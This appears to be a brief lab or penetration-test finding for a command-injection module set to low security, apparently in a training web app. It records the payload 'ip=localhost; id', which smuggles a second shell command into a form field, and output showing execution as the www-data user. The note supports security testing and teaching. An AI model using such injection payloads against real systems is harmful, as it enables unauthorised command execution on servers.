Module: exec (Command Injection) — security level LOW
Payload: ip=localhost; id
Result: uid=33(www-data) gid=33(www-data) groups=33(www-data) — OS command execution as web user confirmed.
POC technique: shell metachar ';' concatenation; ping output + id output in response.
